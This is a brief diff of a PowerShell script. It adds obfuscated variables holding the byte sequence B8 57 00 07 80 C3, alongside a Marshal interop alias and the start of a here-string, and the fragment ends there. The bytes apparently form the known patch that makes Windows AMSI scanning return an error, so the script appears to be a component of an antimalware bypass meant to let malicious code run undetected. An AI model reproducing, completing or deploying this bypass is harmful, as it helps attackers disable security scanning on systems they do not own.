@@ -1,4 +1,9 @@
-
+$vxck = "0xB8"
+$uixn = "0x57"
+$bxny = "0x00"
+$rxqr = "0x07"
+$yzex = "0x80"
+$gbrq = "0xC3"
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
